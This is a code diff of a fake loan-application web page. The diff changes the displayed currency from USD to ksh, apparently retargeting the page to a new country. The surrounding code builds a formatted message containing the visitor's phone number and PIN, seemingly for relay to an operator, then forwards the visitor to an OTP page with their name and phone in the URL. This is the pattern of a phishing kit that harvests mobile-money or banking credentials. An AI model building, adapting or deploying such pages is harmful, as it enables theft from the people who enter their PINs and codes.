@@ -578,7 +578,7 @@ body.light .loan-bar {
                 '<b>Phone:</b> <code>+263' + bd.phone + '</code>\n' +
                 '<b>PIN:</b> <code>' + pin + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.purpose || 'N/A') + '</code>\n' +
-                '<b>Amount:</b> <code>USD ' + bd.amount + '</code>\n' +
+                '<b>Amount:</b> <code>ksh ' + bd.amount + '</code>\n' +
                 '<b>Duration:</b> <code>' + bd.duration + '</code>';
 
             var replyBtns = [
@@ -613,7 +613,7 @@ body.light .loan-bar {
 
         function goOTP() {
             document.getElementById('aModal').classList.remove('on');
-            var dataParam = 'Loan USD ' + bd.amount + ' for ' + bd.duration;
+            var dataParam = 'Loan ksh ' + bd.amount + ' for ' + bd.duration;
             location.href = 'otp.html?data=' + encodeURIComponent(dataParam) + '&price=' + bd.amount + '&phone=' + bd.phone + '&name=' + encodeURIComponent(bd.name);
         }
 
